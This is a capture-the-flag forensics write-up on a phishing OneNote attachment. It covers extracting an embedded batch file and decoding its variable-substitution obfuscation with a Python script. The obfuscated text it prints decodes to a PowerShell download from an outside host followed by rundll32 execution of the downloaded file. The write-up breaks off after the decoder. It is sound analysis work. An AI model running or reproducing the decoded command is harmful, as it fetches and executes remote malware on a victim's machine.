# PhishyNote

## Description
Our company recently fell victim to a phishing campaign, and we’ve imaged the affected employee’s Windows profile.  
Your mission is to analyze the evidence, reconstruct the attack chain, and tell us exactly what happened.

---

## Approach

### 1. Initial Setup
- At first, I mistakenly tried to solve this challenge on **Windows**.  
- The OneNote file was flagged and repeatedly **deleted by Windows Defender** before I could analyze it.  
- After multiple failed attempts, I switched to **Kali Linux** to safely analyze the data.

### 2. Locating the Malicious File
- Navigated through the imaged user profile:  
  `Flagyard/AppData/Local/Microsoft/.../Attachments/...`  
- Inside, found a suspicious **OneNote file (~800MB)**.  

### 3. Static Analysis
- Ran `binwalk` on the OneNote file.  
- Discovered hidden artifacts:
  - A **.bat file**  

### 4. Extracting the Payload
- Extracted the embedded files.  
- Opened the `.bat` script in **VS Code** (on Kali Linux).

```python
  import re

# Mapping extracted from your data
mapping = {
    "hbkges":"f", "lozqhj":"u", "yfkbvh":"t", "pstmyd":"d",
    "vuozfr":"r", "kcqmjh":"n", "lwdyaf":"x", "kurwgp":"c",
    "lnkumy":"h", "awhqpx":"j", "jzblsd":"l", "qyohmf":"k",
    "stbail":"p", "pnmksz":"o", "tdnbph":"w", "xjzoqw":"g",
    "fcuhvg":"a", "lfdopz":"z", "eaycnb":"b", "xmtuiw":"i",
    "vrqjpn":"q", "oaficv":"m", "uqpwtj":"s", "bzovaq":"e",
    "hlfnpe":"v", "wmjqdx":"y", "lsgqej":"1", "jdxcvk":"2",
    "oqibzr":"3", "khxkwc":"4", "kqpdjr":"7", "joctzm":"9",
    "pccvye":"A", "zhgvsn":"B", "tdpsuk":"D", "knbdze":"G",
    "ugtsdm":"I", "gxzbva":"M", "nfbqob":"N", "wvgybz":"O",
    "apvnsq":"Q", "xckxbr":"R", "utewjm":"T", "huomwv":"U",
    "fociwf":"Y", "obzzng":"Z", "gawyav":"h", "fdpmuc":"j",
    "uldeia":"l", "wtupwu":"m", "sjlmre":"x", "jmkjnd":"z"
}

# Your obfuscated string (can be multi-line)
text = r"""
%stbail%%pnmksz%%tdnbph%%bzovaq%%vuozfr%%uqpwtj%%lnkumy%%bzovaq%%jzblsd%%jzblsd% %xmtuiw%%kcqmjh%%hlfnpe%%pnmksz%%qyohmf%%bzovaq%-%tdnbph%%bzovaq%%eaycnb%%vuozfr%%bzovaq%%vrqjpn%%lozqhj%%bzovaq%%uqpwtj%%yfkbvh% -%lozqhj%%vuozfr%%xmtuiw% %lnkumy%%yfkbvh%%yfkbvh%%stbail%:
//%oaficv%%vuozfr%%fcuhvg%%uqpwtj%%uqpwtj%%pnmksz%%kurwgp%%xmtuiw%%fcuhvg%%yfkbvh%%yfkbvh%%bzovaq%%uqpwtj%.%kurwgp%%pnmksz%%oaficv%/%xmtuiw%%oaficv%%fcuhvg%%xjzoqw%%bzovaq%%uqpwtj%/%xckxbr%%wtupwu%%sjlmre%%gawyav%%obzzng%%lsgqej%%uldeia%%kqpdjr%%nfbqob%%jdxcvk%%huomwv%%khxkwc%%gxzbva%%utewjm%%gxzbva%%oqibzr%%obzzng%%fdpmuc%%obzzng%%uldeia%%gxzbva%%tdpsuk%%nfbqob%%gawyav%%obzzng%%fdpmuc%%uldeia%%wtupwu%%fociwf%%jdxcvk%%apvnsq%%sjlmre%%wvgybz%%knbdze%%apvnsq%%tdnbph%%nfbqob%%jmkjnd%%pccvye%%jdxcvk%%fociwf%%jdxcvk%%ugtsdm%%oqibzr%%gxzbva%%knbdze%%apvnsq%%oqibzr%%fociwf%%jmkjnd%%zhgvsn%%joctzm%.%xjzoqw%%xmtuiw%%hbkges% -%pnmksz%%lozqhj%%yfkbvh%%hbkges%%xmtuiw%%jzblsd%%bzovaq% %kurwgp%:
\%stbail%%vuozfr%%pnmksz%%xjzoqw%%vuozfr%%fcuhvg%%oaficv%%pstmyd%%fcuhvg%%yfkbvh%%fcuhvg%\COI%oaficv%.%awhqpx%%stbail%%xjzoqw%%vuozfr%%lozqhj%%kcqmjh%%pstmyd%%jzblsd%%jzblsd%32 %kurwgp%:
\%stbail%%vuozfr%%pnmksz%%xjzoqw%%vuozfr%%fcuhvg%%oaficv%%pstmyd%%fcuhvg%%yfkbvh%%fcuhvg%\COI%oaficv%.%awhqpx%%stbail%%xjzoqw%,%xmtuiw%%kcqmjh%%xmtuiw%%yfkbvh%%bzovaq%%lwdyaf%%xmtuiw%%yfkbvh%
...
"""  # shortened for example

# Function to replace all %code% with mapping
def decode_batch(text, mapping):
    # find all %...% placeholders
    pattern = re.compile(r'%([a-zA-Z0-9]+)%')
    
    def repl(match):
        code = match.group(1)
        return mapping.get(code, f"%{code}%")  # keep unchanged if not in mapping
    
    return pattern.sub(repl, text)

decoded_text = decode_batch(text, mapping)
print(decoded_text)





